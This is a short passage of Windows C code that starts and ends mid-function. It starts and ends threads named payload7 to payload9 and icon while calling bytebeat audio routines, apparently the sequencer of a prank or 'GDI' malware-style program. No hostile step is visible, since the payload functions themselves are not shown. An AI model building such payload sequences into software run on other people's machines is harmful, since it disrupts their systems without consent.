	TerminateThread(thread67, 0);
	TerminateThread(thread6, 0);

	CloseHandle(thread67);
	CloseHandle(thread6);
	HANDLE thread777 = CreateThread(0, 0, payload7, 0, 0, 0);
	HANDLE icons = CreateThread(0, 0, icon, 0, 0, 0);
	bytebeat7();
	TerminateThread(icons, 0);
	TerminateThread(thread777, 0);



	CloseHandle(thread777);
	CloseHandle(icons);
	HANDLE payload888 = CreateThread(0, 0, payload8, 0, 0, 0);
	bytebeat8();
	TerminateThread(payload888, 0);
	CloseHandle(payload888);
	HANDLE payload999 = CreateThread(0, 0, payload9, 0, 0, 0);
	bytebeat9();
	TerminateThread(payload999, 0);
	CloseHandle(payload999);
	Sleep(100);

	return 0;
}